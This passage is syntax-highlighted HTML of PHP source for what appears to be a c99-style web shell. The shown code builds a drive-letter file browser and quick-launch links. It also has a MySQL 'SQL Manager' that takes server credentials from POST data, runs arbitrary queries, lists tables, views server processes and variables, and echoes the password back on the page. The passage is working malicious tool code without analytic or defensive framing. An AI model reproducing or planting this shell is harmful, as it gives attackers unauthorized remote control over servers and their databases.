<span class="s2">   </span><span class="si">$letters</span><span class="s2"> .= &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;ls&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;:</span><span class="se">\&quot;</span><span class="s2">).&quot;</span><span class="s1">&#39;;document.todo.submit();\&quot;&amp;gt;[ &quot;;</span>
<span class="s1">   if ($letter.&quot;:&quot; != $v) {$letters .= $letter;}</span>
<span class="s1">   else {$letters .= &quot;&amp;lt;font color=green&amp;gt;&quot;.$letter.&quot;&amp;lt;/font&amp;gt;&quot;;}</span>
<span class="s1">   $letters .= &quot; ]&amp;lt;/a&amp;gt; &quot;;</span>
<span class="s1">  }</span>
<span class="s1"> }</span>
<span class="s1"> if (!empty($letters)) {echo &quot;&amp;lt;b&amp;gt;Detected drives&amp;lt;/b&amp;gt;: &quot;.$letters.&quot;&amp;lt;br&amp;gt;&quot;;}</span>
<span class="s1">}</span>
<span class="s1">if (count($quicklaunch) &amp;gt; 0)</span>
<span class="s1">{</span>
<span class="s1"> foreach($quicklaunch as $item)</span>
<span class="s1"> {</span>
<span class="s1">  $item[1] = str_replace(&quot;%d&quot;,urlencode($d),$item[1]);</span>
<span class="s1">  $item[1] = str_replace(&quot;%sort&quot;,$sort,$item[1]);</span>
<span class="s1">  $v = realpath($d.&quot;..&quot;);</span>
<span class="s1">  if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}</span>
<span class="s1">  $item[1] = str_replace(&quot;%upd&quot;,urlencode($v),$item[1]);</span>

<span class="s1">  echo &quot;&amp;lt;a href=\&quot;&quot;.$item[1].&quot;\&quot;&amp;gt;&quot;.$item[0].&quot;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;;</span>
<span class="s1"> }</span>
<span class="s1">}</span>
<span class="s1">echo &quot;&amp;lt;/p&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&quot;;</span>
<span class="s1">if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo &quot;&amp;lt;TABLE style=\&quot;BORDER-COLLAPSE: collapse\&quot; cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\&quot;100%\&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=\&quot;100%\&quot; valign=\&quot;top\&quot;&amp;gt;&quot;.$donated_html.&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&quot;;}</span>
<span class="s1">echo &quot;&amp;lt;TABLE style=\&quot;BORDER-COLLAPSE: collapse\&quot; cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\&quot;100%\&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=\&quot;100%\&quot; valign=\&quot;top\&quot;&amp;gt;&quot;;</span>
<span class="s1">if ($act == &quot;&quot;) {$act = $dspact = &quot;ls&quot;;}</span>
<span class="s1">if ($act == &quot;sql&quot;)</span>
<span class="s1">{</span>
<span class="s1"> echo(&quot;&amp;lt;form name=&#39;</span><span class="nx">sql</span><span class="s1">&#39; method=&#39;</span><span class="nx">POST</span><span class="s1">&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">act</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;</span><span class="nx">sql</span><span class="s1">&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_tbl_insert_q</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_login</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">kill</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_order</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_tbl_ls</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_tbl_le</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_tbl_act</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">thistbl</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_passwd</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_server</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_port</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_db</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_act</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_tbl</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">f</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">ft</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;</span><span class="nx">sql_query</span><span class="s1">&#39; type=&#39;</span><span class="nx">hidden</span><span class="s1">&#39; value=&#39;&#39;&amp;gt;&amp;lt;/form&amp;gt;&quot;);</span>

<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_login</span><span class="s1">&#39;]))  {$sql_login=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_login</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_passwd</span><span class="s1">&#39;])) {$sql_passwd=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_passwd</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_server</span><span class="s1">&#39;])) {$sql_server=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_server</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_port</span><span class="s1">&#39;]))   {$sql_port=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_port</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_db</span><span class="s1">&#39;]))     {$sql_db=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_db</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_act</span><span class="s1">&#39;]))     {$sql_act=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_act</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_tbl</span><span class="s1">&#39;]))     {$sql_tbl=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_tbl</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_tbl_act</span><span class="s1">&#39;]))     {$sql_tbl_act=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_tbl_act</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">thistbl</span><span class="s1">&#39;]))     {$thistbl=htmlspecialchars($_POST[&#39;</span><span class="nx">thistbl</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_order</span><span class="s1">&#39;]))     {$sql_order=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_order</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_tbl_ls</span><span class="s1">&#39;]))     {$sql_tbl_ls=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_tbl_ls</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_tbl_le</span><span class="s1">&#39;]))     {$sql_tbl_le=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_tbl_le</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_query</span><span class="s1">&#39;]))     {$sql_query=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_query</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_tbl_insert_q</span><span class="s1">&#39;])) {$sql_tbl_insert_q=urldecode(htmlspecialchars($_POST[&#39;</span><span class="nx">sql_tbl_insert_q</span><span class="s1">&#39;]));}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_tbl_insert_functs</span><span class="s1">&#39;])) {$sql_tbl_insert_functs=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_tbl_insert_functs</span><span class="s1">&#39;]);}</span>
<span class="s1"> if (isset($_POST[&#39;</span><span class="nx">sql_tbl_insert_radio</span><span class="s1">&#39;])) {$sql_tbl_insert_radio=htmlspecialchars($_POST[&#39;</span><span class="nx">sql_tbl_insert_radio</span><span class="s1">&#39;]);}</span>



<span class="s1"> ?&gt;&amp;lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=&quot;#C0C0C0&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;100%&quot; height=&quot;1&quot; colspan=&quot;2&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;center&amp;gt;&lt;?php</span>
<span class="s1"> if ($sql_server)</span>
<span class="s1"> {</span>
<span class="s1">  $sql_sock = mysql_connect($sql_server.&quot;:&quot;.$sql_port, $sql_login, $sql_passwd);</span>
<span class="s1">  $err = mysql_smarterror();</span>
<span class="s1">  @mysql_select_db($sql_db,$sql_sock);</span>
<span class="s1">  if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}</span>
<span class="s1"> }</span>
<span class="s1"> else {$sql_sock = FALSE;}</span>
<span class="s1"> echo &quot;&amp;lt;b&amp;gt;SQL Manager:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;;</span>
<span class="s1"> if (!$sql_sock)</span>
<span class="s1"> {</span>
<span class="s1">  if (!$sql_server) {echo &quot;NO CONNECTION&quot;;}</span>
<span class="s1">  else {echo &quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Can&#39;</span><span class="nx">t</span> <span class="nx">connect</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">center</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;; echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.</span><span class="si">$err</span><span class="s2">.&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}</span>
<span class="s2"> }</span>
<span class="s2"> else</span>
<span class="s2"> {</span>
<span class="s2">  </span><span class="si">$sqlquicklaunch</span><span class="s2"> = array();</span>
<span class="s2">  </span><span class="si">$sqlquicklaunch</span><span class="s2">[] = array(&quot;</span><span class="nx">Index</span><span class="s2">&quot;,&quot;</span><span class="c1">#\&quot; onclick=\&quot;document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;.htmlspecialchars($sql_login).&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;.htmlspecialchars($sql_passwd).&quot;&#39;;document.sql.sql_server.value=&#39;&quot;.htmlspecialchars($sql_server).&quot;&#39;;document.sql.sql_port.value=&#39;&quot;.htmlspecialchars($sql_port).&quot;&#39;;document.sql.submit();&quot;);</span>
  <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Query&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_act.value=&#39;query&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();&quot;</span><span class="p">);</span>
  <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Server-status&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_act.value=&#39;serverstatus&#39;;document.sql.submit();&quot;</span><span class="p">);</span>
  <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Server variables&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_act.value=&#39;servervars&#39;;document.sql.submit();&quot;</span><span class="p">);</span>
  <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Processes&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_act.value=&#39;processes&#39;;document.sql.submit();&quot;</span><span class="p">);</span>
  <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Logout&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.submit();&quot;</span><span class="p">);</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;MySQL &quot;</span><span class="o">.</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; (proto v.&quot;</span><span class="o">.</span><span class="nb">mysql_get_proto_info</span> <span class="p">()</span><span class="o">.</span><span class="s2">&quot;) running in &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; as &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;@&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (password - </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$sqlquicklaunch</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$sqlquicklaunch</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;[ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; ] &quot;</span><span class="p">;}}</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="p">{</span><span class="cp">?&gt;</span><span class="x">&amp;lt;td width=&quot;28%&quot; height=&quot;100&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;font size=&quot;5&quot;&amp;gt; i &amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;li&amp;gt;If login is null, login is owner of process.&amp;lt;li&amp;gt;If host is null, host is localhost&amp;lt;/b&amp;gt;&amp;lt;li&amp;gt;If port is null, port is 3306 (default)&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;90%&quot; height=&quot;1&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;TABLE height=1 cellSpacing=0 cellPadding=0 width=&quot;100%&quot; border=0&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;nbsp;&amp;lt;b&amp;gt;Please, fill the form:&amp;lt;/b&amp;gt;&amp;lt;table&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Username&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Password&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Database&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_login&quot; value=&quot;root&quot; maxlength=&quot;64&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;password&quot; name=&quot;sql_passwd&quot; value=&quot;&quot; maxlength=&quot;64&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_db&quot; value=&quot;&quot; maxlength=&quot;64&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Host&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;PORT&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td align=right&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_server&quot; value=&quot;localhost&quot; maxlength=&quot;64&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_port&quot; value=&quot;3306&quot; maxlength=&quot;6&quot; size=&quot;3&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;Connect&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/td&amp;gt;</span><span class="cp">&lt;?php</span> <span class="p">}</span>
 <span class="k">else</span>
 <span class="p">{</span>
  <span class="c1">//Start left panel</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">))</span>
  <span class="p">{</span>
   <span class="cp">?&gt;</span><span class="x">&amp;lt;td width=&quot;25%&quot; height=&quot;100%&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;</span><span class="cp">&lt;?</span><span class="k">echo</span> <span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">))</span> <span class="cp">?&gt;</span><span class="x">&#39;;document.sql.sql_passwd.value=&#39;</span><span class="cp">&lt;?</span><span class="k">echo</span> <span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">))</span> <span class="cp">?&gt;</span><span class="x">&#39;;document.sql.sql_server.value=&#39;</span><span class="cp">&lt;?</span><span class="k">echo</span> <span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">))</span> <span class="cp">?&gt;</span><span class="x">&#39;;document.sql.sql_port.value=&#39;</span><span class="cp">&lt;?</span><span class="k">echo</span> <span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">))</span> <span class="cp">?&gt;</span><span class="x">&#39;;document.sql.submit();&quot;&amp;gt;&amp;lt;b&amp;gt;Home&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;hr size=&quot;1&quot; noshade&amp;gt;</span><span class="cp">&lt;?php</span>
   <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_list_tables</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
   <span class="k">else</span>
   <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;---[ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span 